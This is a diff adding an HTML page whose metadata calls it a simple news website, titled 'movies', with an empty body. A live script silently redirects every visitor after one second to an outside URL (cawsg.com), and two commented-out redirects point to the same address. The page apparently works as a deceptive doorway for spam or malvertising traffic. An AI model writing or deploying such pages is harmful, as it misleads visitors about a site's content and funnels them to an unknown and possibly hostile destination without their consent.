@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="A simple news website featuring the latest articles and updates.">
+    <meta name="keywords" content="news, articles, updates, journalism, media">
+    <meta name="author" content="movies">
+     <!-- Meta tag for auto-redirect -->
+    <!--<meta http-equiv="refresh" content="0; url="https://cawsg.com/4/9115123">-->
+    <!--<script>
+        window.location.href = "https://cawsg.com/4/9115123";
+    </script>-->
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://cawsg.com/4/9115123";
+        }, 1000); // 1000 milliseconds = 1 seconds
+    </script>
+    <title>movies</title>
+</head>
+<body>
+</body>
+</html>
